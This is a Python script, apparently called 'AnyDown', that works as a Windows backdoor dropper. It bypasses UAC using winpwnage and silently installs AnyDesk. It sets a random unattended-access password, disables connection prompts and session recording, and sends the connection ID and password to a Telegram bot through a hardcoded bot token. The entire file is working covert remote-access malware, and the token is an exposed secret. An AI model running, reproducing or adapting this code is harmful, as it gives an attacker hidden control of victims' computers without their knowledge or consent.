import wget
import os
import requests
import random
import string
import subprocess
import ctypes, sys
from sys import exit
from shutil import copyfile
from winpwnage.functions.uac.uacMethod2 import  uacMethod2

def get_random_alphaNumeric_string(stringLength=10):
    lettersAndDigits = string.ascii_letters + string.digits
    return ''.join((random.choice(lettersAndDigits) for i in range(stringLength)))

def telegram_bot_sendtext(bot_message):
   if os.path.exists("chatid.dat"):
       with open("chatid.dat") as chatidFile:
           bot_chatID = chatidFile.read()
   else:
       print("Error! You shouldn't be here! No chatid.dat!")
       exit(-1)
   print(bot_chatID)
   bot_token = '1267083900:AAEddgZ-cH6xl-A2IRZI7bPm2i6lMl6SN5Q'
   send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message

   response = requests.get(send_text)

   return response.json()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


appdata = os.getenv("APPDATA")

if is_admin():
    print("I am admin!")
    if os.path.exists("chatid.dat"):
        copyfile("chatid.dat", appdata + "\\chatid.dat")
    if os.path.exists("AnyDown.msi"):
        copyfile("AnyDown.msi", appdata + "\\AnyDown.msi")
else:
    # Re-run the program with admin rights
    #ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1) #UAC REQUEST
    #Copy file to roaming dir else it will not be found
    copyfile("chatid.dat", appdata + "\\chatid.dat")
    if os.path.exists("AnyDown.msi"):
        copyfile("AnyDown.msi", appdata + "\\AnyDown.msi")
    uacMethod2([sys.executable])#system32
    sys.exit(0)

os.chdir(appdata)
#print(os.path.realpath(__file__))
print(appdata)

if os.path.exists("chatid.dat"):
   with open("chatid.dat") as chatidFile:
       print(chatidFile.read())
else:
   print("Error! You shouldn't be here! No chatid.dat!")
   exit(-1)


if os.path.exists("AnyDesk.msi"):
    print("AnyDesk file is there. Using it.")
else:
    print("Downloading AnyDesk.msi...")
    anyurl = "https://download.anydesk.com/AnyDesk.msi"
    anyfile = wget.download(anyurl)
    print("Downloaded. Continuing...")

print("Removing old instances...\n")
subprocess.run("msiexec /x AnyDesk.msi /qn", shell=True)
print("Installing anydesk...")
subprocess.run("msiexec /i AnyDesk.msi /qn", shell=True)
print("Configuring options...")
installdir = appdata + "\\AnyDesk\\ad_msi"
configdir = os.getenv("SystemDrive") + "\\ProgramData\\AnyDesk\\ad_msi"
if os.path.exists(os.getenv("SystemDrive") + "\\Program Files (x86)\\AnyDeskMSI\\AnyDeskMSI.exe"):
    AnyDeskExe = '"' + os.getenv("SystemDrive") + '\\Program Files (x86)\\AnyDeskMSI\\AnyDeskMSI.exe"'
elif os.path.exists(os.getenv("SystemDrive") + "\\Program Files\\AnyDeskMSI\\AnyDeskMSI.exe"):
    AnyDeskExe = '"' + os.getenv("SystemDrive") + '\\Program Files\\AnyDeskMSI\\AnyDeskMSI.exe"'
else:
    print("Error: no anydesk here")
    exit()
anypass = get_random_alphaNumeric_string()
print("Setting password...")
subprocess.run("echo " + anypass + " | " + AnyDeskExe + " --set-password", shell=True)
config = open(configdir + "\\system.conf", "a+")
print("Writing configs...")
config.write("\nad.security.interactive_access=2")
config.write("\nad.recording.incoming=false")
config.close()
with open(configdir + "\\system.conf", 'r') as f:
    for line in f.readlines():
        if 'ad.anynet.id' in line:
            anyid = line
print(anyid)
print(anypass)

print("Sending infos...")
telegram_bot_sendtext("Henlo! AnyDown here!")
telegram_bot_sendtext("Your connection ID is: " + anyid)
telegram_bot_sendtext("Your password is: " + anypass)

exit(0)
print("Removing leftovers...")
os.remove("AnyDesk.msi")
os.remove("chatid.dat")